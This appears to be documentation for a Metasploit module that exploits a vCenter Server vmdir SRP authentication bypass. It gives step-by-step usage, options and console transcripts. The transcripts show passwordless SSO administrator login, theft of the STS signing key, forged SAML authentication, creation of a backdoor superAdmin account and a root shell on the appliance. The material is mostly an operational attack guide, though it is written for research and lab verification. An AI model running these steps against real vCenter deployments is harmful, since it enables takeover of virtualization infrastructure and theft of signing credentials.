## Vulnerable Application

VMware vCenter Server's vmdir SRP RPC interface exposes pending session keys before authentication (CVE-2026-123890).
Context handles are looked up across client associations and use predictable UUIDv1 timestamps. This module recovers a
pending login key, authenticates as an existing SSO administrator, and verifies an encrypted, authorized directory-state
read.

The default `RPC` action retains an interactive vmdir RPC session. The optional `SHELL` action downloads the directory
database, extracts the STS signing key, forges an administrator SAML assertion, and authenticates to the appliance REST
API. It creates a local `superAdmin` account and enables SSH and Bash if necessary. With the default
`CreateSession true`, it opens a root command shell using the generated account's password and its sudo authorization.
Setting `CreateSession false` prints and retains the generated credentials for manual login without connecting to SSH.
The existing SSO and root passwords are not needed.

The module targets the legacy SRP mechanism used by **vCenter 8.0.2.00400, build 23929136**, on Photon OS 4.0. The
standalone PoC and native Ruby module have been verified on this build, including database export, forged SAML API
authentication, and root execution. Other builds have not been functionally tested. The precise earliest affected build
is unknown. Broadcom identifies **8.0 U3m** as the fixed 8.0 release; the fixed release has not been regression-tested
here.

References:

- [Google/Mandiant ARMORY CASTLE research][armory-castle]
- [VMware VMSA-2026-0009 FAQ][faq]

[armory-castle]: https://cloud.google.com/blog/topics/threat-intelligence/armory-castle-exploits-vsphere
[faq]:
https://github.com/vmware/vcf-security-and-compliance-guidelines/blob/main/security-advisories/vmsa-2026-0009/README.md

### Setup

1. Obtain `VMware-VCSA-all-8.0.2-23929136.iso` through the vendor's software portal with the required entitlement.
1. Deploy its vCenter Server Appliance and complete Stage 2 to initialize SSO. The tested domain is `vsphere.local` with
   its existing `administrator` account.
1. Make TCP port 2012 reachable from the Metasploit host. The `RPC` action does not require SSH access.
1. For `SHELL`, also allow connections to the HTTPS API on TCP 443. SSH and Bash can initially be disabled; the action
   enables them through the API. With `CreateSession true`, also allow SSH on TCP 22. With `CreateSession false`, the
   module creates the credentials without requiring an SSH connection.

The module creates transient SRP verifier contexts and deletes its own reference contexts in an ensure block. GSS owns
the pending login context and releases it on disconnect. The `RPC` action creates no persistent accounts or target
files. A bounded search can fail because of timing, concurrent logins, or a different implementation; that result does
not establish that the target is patched.

The `SHELL` action creates a local account and its managed home directory and changes global access settings. With
`CreateSession true`, it closes the SSH transport before restoring those settings and deleting the account through the
appliance API. Cleanup runs when the shell exits, including after backgrounding. Disabling SSH disconnects active SSH
connections, so access cannot be restored while retaining the shell. With `CreateSession false`, successful provisioning
leaves the account and access settings in place for manual use; the operator must restore the saved settings and remove
the account when finished, including after partial provisioning. Automatic cleanup on a failed run applies when
`CreateSession true`. When Bash is initially disabled, the module enables it with a 600-second timeout. Do not run
concurrent `SHELL` actions against the same appliance.

The module saves the downloaded database, STS signing credentials, generated account credentials, API session ID, and
original settings as loot. If the console is terminated or cleanup fails, use those recovery details with an authorized
appliance administrator to restore access and remove the named account. API session IDs expire; the saved STS
credentials can sign a fresh assertion. Cleanup does not remove audit records or invalidate the stolen STS key. The
database parser uses the existing extractor's `TenantCredential-1` record layout; appliances with a different
signing-credential layout are untested.

## Verification Steps

1. Start `msfconsole` from this checkout.
1. Do: `use auxiliary/admin/vmware/vcenter_srp_auth_bypass`
1. Do: `set RHOSTS <vcenter_address>`
1. Set `USERNAME` if the SSO principal differs from `administrator@vsphere.local`.
1. Do: `check`. A vulnerable result requires reading an owned context's pending session key over a separate anonymous
   association, before any password proof.
1. Do: `run verbose=true`. Expect a recovered context/key, successful passwordless authentication, an encrypted GetState
   result, and a JSON loot path. Directory state 3 means Normal; successful operation status and response integrity are
   checked independently of the state value.
1. With the default `CreateSession true`, expect an interactive `vmdir >` prompt.
1. Do: `whoami`, then `state` twice. The principal and protected state should remain available on the same authenticated
   connection.
1. Do: `background`, then `sessions -i <id>` to resume the RPC session.
1. Do: `exit` inside the session to close its connection.
1. Do: `set CreateSession false`, then repeat `run verbose=true`. Expect the verified state/loot result with no retained
   session.
1. Do: `set ACTION SHELL`, then `set CreateSession true` and `run verbose=true`. Expect database and signing-credential
   loot, a temporary-account recovery file, a verified `uid=0(root)` result, and an interactive command shell.
1. Run `id` and `whoami`. Expect root. Background with the shell's `background` command and resume with
   `sessions -i <id>`.
1. Exit the shell. Expect confirmation that the original SSH/Bash settings were restored and the temporary administrator
   was removed. Verify the settings and account list independently through the appliance management API or UI.
1. Set `CreateSession false` and run the `SHELL` action again. Expect the generated username/password and recovery loot
   path, with the account and access settings retained. The module must not log in over SSH or open a session.
1. Verify the account and access settings independently, then remove the account and restore the saved settings after
   manual use.

## Options

### CreateSession

Defaults to `true`. Register the action's session and enter it when running in the foreground with console input/output.
The `RPC` action provides a directory console with `state` and `whoami`, together with standard commands such as `help`,
`background`, `exit`, and `irb`. `whoami` shows the authenticated SSO principal. The `SHELL` action provides a Unix
command shell running as root. Backgrounding retains the session and any temporary appliance state; exiting closes the
connection and runs cleanup.

With `RPC`, setting this option to `false` verifies the bypass and saves its evidence without retaining a session. With
`SHELL`, it creates and prints a local administrator's credentials and leaves the account and SSH/Bash settings in place
for manual login. The module does not attempt SSH authentication or execute shell commands in this mode, so the
generated SSH credentials are recorded as untried. The appliance API session is logged out in either mode. Use the saved
recovery details to restore access settings and delete the account after manual use.

### USERNAME

An existing SSO principal authorized to read directory state. The default is `administrator@vsphere.local`. No password
is requested or recovered.

### ApiPort

Advanced HTTPS API port for `SHELL`; default 443. It is independent of the RPC `RPORT`. The API always uses TLS.

### SshPort

Advanced SSH port for `SHELL`; default 22. The inherited `SSH_TIMEOUT`, which this module defaults to 30 seconds, bounds
connection setup and the appliance-shell dialog when `CreateSession` is `true`.

### MaxDbSize

Advanced database download limit for `SHELL`, in MiB; default 256. The download is held in memory before being saved as
loot. Larger databases require a higher limit and enough available memory on the Metasploit host.

### MaxGuesses

Advanced option bounding context-key oracle requests; default 200000.

### UuidStep

Advanced option selecting UUID timestamp increments: `10` (default) searches microseconds; `1` also covers
100-nanosecond uniqueness adjustments. The latter requires up to ten times as many requests for the same window.

### SearchTimeout

Advanced option bounding the UUID search in seconds; default 180. Search exhaustion or a timeout is inconclusive.

### ReadTimeout

Advanced option bounding each RPC exchange in seconds; default 10. Connection establishment uses the inherited
`ConnectTimeout`.

## Scenarios
Both scenarios where tested against a vCenter 8.0.2.00400 appliance
### Action RPC, CreateSession true
```
msf auxiliary(admin/vmware/vcenter_srp_auth_bypass) > options

Module options (auxiliary/admin/vmware/vcenter_srp_auth_bypass):

   Name           Current Setting              Required  Description
   ----           ---------------              --------  -----------
   CreateSession  true                         no        Create a new session for every successful login
   Proxies                                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, socks5h
   RHOSTS         192.168.1.81                 yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          2012                         yes       The target port (TCP)
   SSL            false                        no        Negotiate SSL/TLS for outgoing connections
   USERNAME       administrator@vsphere.local  yes       Existing SSO administrator principal
   VHOST                                       no        HTTP server virtual host


Auxiliary action:

   Name   Description
   ----   -----------
   RPC    Use STS signing credentials and appliance administration APIs to open a root shell

msf auxiliary(admin/vmware/vcenter_srp_auth_bypass) > run
[*] Running module against 192.168.1.81
[*] 192.168.1.81:2012 - Running automatic check ("set AutoCheck false" to disable)
[+] 192.168.1.81:2012 - The target is vulnerable. An anonymous association retrieved a pending SRP key owned by another association
[*] 192.168.1.81:2012 - Searching the pending SRP context between two reference UUIDs
[*] 192.168.1.81:2012 - Recovered the pending session key after 13256 guesses in 2.97 seconds
[+] 192.168.1.81:2012 - Authenticated as administrator@vsphere.local without a password; protected directory state: 3
[+] 192.168.1.81:2012 - Saved authentication evidence to /Users/jheysel/.msf4/loot/20261120064315_default_192.168.1.81_vmware.vmdir.srp_352131.json
[*] VMware directory RPC session 1 opened (192.168.1.70:62120 -> 192.168.1.81:2012) at 2026-11-20 06:43:17 -0700
[*] 192.168.1.81:2012 - Interacting with vmdir session 1; use background to return to msfconsole
vmdir > whoami
Authenticated SSO principal: administrator@vsphere.local
```


### Action SHELL, CreateSession true
```
msf auxiliary(admin/vmware/vcenter_srp_auth_bypass) > options

Module options (auxiliary/admin/vmware/vcenter_srp_auth_bypass):

   Name           Current Setting              Required  Description
   ----           ---------------              --------  -----------
   CreateSession  true                         no        Create a new session for every successful login
   Proxies                                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, socks5h
   RHOSTS         192.168.1.81                 yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          2012                         yes       The target port (TCP)
   SSL            false                        no        Negotiate SSL/TLS for outgoing connections
   USERNAME       administrator@vsphere.local  yes       Existing SSO administrator principal
   VHOST                                       no        HTTP server virtual host


Auxiliary action:

   Name   Description
   ----   -----------
   SHELL  Use STS signing credentials and appliance administration APIs to open a root shell



View the full module info with the info, or info -d command.

msf auxiliary(admin/vmware/vcenter_srp_auth_bypass) > run
[*] Running module against 192.168.1.81
[*] 192.168.1.81:2012 - Running automatic check ("set AutoCheck false" to disable)
[+] 192.168.1.81:2012 - The target is vulnerable. An anonymous association retrieved a pending SRP key owned by another association
[*] 192.168.1.81:2012 - Searching the pending SRP context between two reference UUIDs
[*] 192.168.1.81:2012 - Recovered the pending session key after 20216 guesses in 5.59 seconds
[+] 192.168.1.81:2012 - Authenticated as administrator@vsphere.local without a password; protected directory state: 3
[+] 192.168.1.81:2012 - Saved authentication evidence to /Users/jheysel/.msf4/loot/20261120081947_default_192.168.1.81_vmware.vmdir.srp_152835.json
[*] 192.168.1.81:2012 - Downloading the directory database over the authenticated RPC association
[+] 192.168.1.81:2012 - Saved STS key to /Users/jheysel/.msf4/loot/20261120082134_default_192.168.1.81_vmware.vcenter.s_111747.key
[+] 192.168.1.81:2012 - Saved STS certificate to /Users/jheysel/.msf4/loot/20261120082134_default_192.168.1.81_vmware.vcenter.s_193197.crt
[+] 192.168.1.81:2012 - Saved STS ca_certificate to /Users/jheysel/.msf4/loot/20261120082135_default_192.168.1.81_vmware.vcenter.s_846465.crt
[*] 192.168.1.81:2012 - Creating temporary appliance administrator williams-schiller; recovery details: /Users/jheysel/.msf4/loot/20261120082139_default_192.168.1.81_vmware.vcenter.s_704763.json
[+] 192.168.1.81:2012 - Root execution verified: uid=0(root) gid=0(root) groups=0(root),4044(shellaccess)
[*] Command shell session 1 opened (192.168.1.70:50908 -> 192.168.1.81:22) at 2026-11-20 08:21:53 -0700
[*] 192.168.1.81:2012 - The temporary account and original SSH/Bash settings will be restored when this session closes
[*] 192.168.1.81:2012 - Interacting with shell session 1; use background to return to msfconsole

root [ /home/williams-schiller ]# id
id
uid=0(root) gid=0(root) groups=0(root),4044(shellaccess)
root [ /home/williams-schiller ]# uname -a
uname -a
Linux node-1w7jr9qrllzwd9vncrrr8zlf9.ipv6.telus.net 5.10.201-1.ph4 #1-photon SMP Fri Dec 8 00:43:17 UTC 2023 x86_64 GNU/Linux
```

